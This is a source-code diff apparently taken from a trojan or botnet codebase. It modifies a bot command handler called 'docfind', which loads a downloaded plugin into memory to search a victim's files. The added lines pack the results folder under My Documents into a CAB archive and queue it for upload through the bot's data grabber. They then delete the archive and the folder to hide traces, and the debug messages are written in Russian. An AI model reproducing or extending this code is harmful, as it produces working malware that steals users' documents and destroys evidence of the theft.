@@ -14,6 +14,8 @@
 #include "Inject.h"
 #include "BotHosts.h"
 #include "Plugins.h"
+#include <shlobj.h>
+#include <shlwapi.h>
 
 
 /* TODO :
@@ -751,26 +753,32 @@ bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 	bool res = false;
 	if( data )
 	{
-		TASKDBG( "----", "0" );
 		File::WriteBufferA( "c:\\docfind.plug", data, size );
 		HMEMORYMODULE module = MemoryLoadLibrary(data);
-		TASKDBG( "----", "01" );
 		if( module )
 		{
-			TASKDBG( "----", "1" );
 			DWORD* gAltEPOffs = (DWORD*) MemoryGetProcAddress( module, "gAltEPOffs" );
 			if( gAltEPOffs )
 			{
-				TASKDBG( "----", "2" );
 				typeBuildStubDllMain func = (typeBuildStubDllMain)gAltEPOffs[0];
 				if( func )
 				{
-					TASKDBG( "----", "3" );
+					TASKDBG( "Task", "Выполняется команда docfind" );
 					HANDLE hEvent = pCreateEventA( NULL, FALSE, FALSE, "Global\\_SearchComplete32" );
 					func( 0, DLL_PROCESS_ATTACH, 0 );
 					DWORD dwWait = (DWORD)pWaitForSingleObject( hEvent, INFINITE );
 					pCloseHandle(hEvent);
-					TASKDBG( "----", "4" );
+					char path[MAX_PATH], tmpName[MAX_PATH];
+					pSHGetFolderPathA( 0, CSIDL_MYDOCUMENTS,  0, 0, path );
+					pPathAppendA( path, "search" );
+					TASKDBG( "Task", "Поиск файлов завершен, отправляем папку %s", path );
+					File::GetTempName(tmpName);
+					HCAB cab = CreateCab(tmpName);
+					AddDirToCab( cab, path, "docfind" );
+					CloseCab(cab);
+					DataGrabber::SendCabDelayed( 0, tmpName, "docfind" );
+					pDeleteFileA(tmpName);
+					Directory::Delete(path);
 				}
 			}
 			MemoryFreeLibrary(module);
